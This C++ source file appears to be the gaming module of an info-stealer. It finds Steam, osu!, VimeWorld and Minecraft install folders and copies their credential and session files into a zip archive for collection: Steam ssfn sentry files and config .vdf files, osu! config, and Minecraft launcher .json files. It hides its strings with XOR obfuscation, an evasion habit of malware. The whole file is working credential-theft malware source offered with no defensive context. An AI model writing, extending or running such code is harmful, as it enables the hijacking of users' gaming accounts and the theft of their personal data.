#include "gaming.h"

#include "../../winapi/winapi.h"
#include "../../utilities/xor/xor.h"
#include "../../utilities/tools/tools.h"
#include "../../utilities/zip_handle/zip_handle.h"
#include "../../utilities/crt/crt.h"
#include "../../utilities/directories/directories.h"
#include "../../utilities/globals/globals.h"

#include <fstream>
#include <filesystem>

namespace fs = std::filesystem;

gaming g_gaming;

void gaming::vimeworld(std::string path)
{
	std::string from = path.c_str() + std::string(XOR_STRING("config"));
	std::string file_name = std::string(XOR_STRING("Apps/Vimeworld/")) + std::string(XOR_STRING("config"));
	std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

	g_zip.write_zip(file_name.c_str(), buffer);
}

void gaming::osu(std::string user_name, std::string path)
{
	std::string from = path.c_str() + std::string(XOR_STRING("osu!.")) + user_name + std::string(XOR_STRING(".cfg"));
	std::string file_name = std::string(XOR_STRING("Apps/osu!/")) + std::string(XOR_STRING("osu!.")) + user_name + std::string(XOR_STRING(".cfg"));
	std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

	g_zip.write_zip(file_name.c_str(), buffer);
}

void gaming::steam(std::string path)
{
	std::string config_dir = path.c_str() + std::string(XOR_STRING("config") + std::string(XOR_STRING("\\")));
	std::string dir = path.c_str() + std::string(XOR_STRING("*"));

	WIN32_FIND_DATA file_data;
	HANDLE handle = g_winapi.FindFirstFileA(dir.c_str(), &file_data);

	do {
		std::string file = std::string(XOR_STRING("ssfn"));
		std::string target = std::string(file_data.cFileName);

		if (g_crt.strstr(target.c_str(), file.c_str()))
		{
			std::string from = path.c_str() + std::string(target.c_str());
			std::string file_name = std::string(XOR_STRING("Apps/Steam/")) + std::string(target.c_str());
			std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

			g_zip.write_zip(file_name.c_str(), buffer);
		}

	} while (g_winapi.FindNextFileA(handle, &file_data) != 0);

	for (auto &p : fs::directory_iterator(config_dir.c_str()))
	{
		if (p.path().extension() == XOR_STRING(".vdf"))
		{
			std::string from = config_dir.c_str() + p.path().stem().string() + std::string(XOR_STRING(".vdf"));
			std::string file_name = std::string(XOR_STRING("Apps/Steam/config/")) + p.path().stem().string() + std::string(XOR_STRING(".vdf"));
			std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

			g_zip.write_zip(file_name.c_str(), buffer);
		}
	}

	if (handle) {
		g_winapi.CloseHandle(handle);
	}
}

void gaming::minecraft(std::string path)
{
	for (auto &p : fs::directory_iterator(path.c_str()))
	{
		if (p.path().extension() == XOR_STRING(".json"))
		{
			std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".json"));
			std::string file_name = std::string(XOR_STRING("Apps/Minecraft/")) + p.path().stem().string() + std::string(XOR_STRING(".json"));
			std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

			g_zip.write_zip(file_name.c_str(), buffer);
		}
	}
}

void gaming::run()
{
	std::string user_name = g_tools.get_user_name();

	std::string steam_dir = g_dir.get_program_files86() +
		std::string(XOR_STRING("Steam\\"));

	std::string osu_dir = g_dir.get_local_appdata() +
		std::string(XOR_STRING("osu!\\"));

	std::string vimeworld_dir = g_dir.get_roaming_appdata() +
		std::string(XOR_STRING(".vimeworld\\"));

	std::string minecraft_dir = g_dir.get_roaming_appdata() +
		std::string(XOR_STRING(".minecraft\\"));

	if (g_tools.check_directory(steam_dir.c_str()) == DIR_FOUNDED)
	{
		steam(steam_dir.c_str());
		g_globals.apps_count++;
	}

	if (g_tools.check_directory(osu_dir.c_str()) == DIR_FOUNDED)
	{
		osu(user_name.c_str(), osu_dir.c_str());
		g_globals.apps_count++;
	}

	if (g_tools.check_directory(vimeworld_dir.c_str()) == DIR_FOUNDED)
	{
		vimeworld(vimeworld_dir.c_str());
		g_globals.apps_count++;
	}

	if (g_tools.check_directory(minecraft_dir.c_str()) == DIR_FOUNDED)
	{
		minecraft(minecraft_dir.c_str());
		g_globals.apps_count++;
	}
}